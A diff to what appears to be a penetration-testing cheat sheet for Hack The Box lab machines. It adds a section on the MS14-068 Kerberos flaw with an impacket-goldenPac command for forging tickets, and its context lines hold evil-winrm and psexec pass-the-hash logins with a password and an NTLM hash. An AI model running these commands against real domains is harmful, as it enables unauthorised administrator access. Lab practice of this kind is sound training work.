@@ -22,6 +22,17 @@ evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
 psexec administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
 ```
 
+
+# Pass-The-Ticket
+goldenPac.py is an exploitation script for the CVE-2014-6324 (MS14-068). If the domain controller is vulnerable, it is possible to forge a Golden Ticket without knowing the krbtgt hash by bypassing the PAC signature verification.
+
+After copy the ticket to /tmp/krb5cc_O
+
+```impacket-goldenPac
+impacket-goldenPac HTB.LOCAL/james@mantis.htb.local
+```
+
+
 # SSL
 
 ## evil-winrm
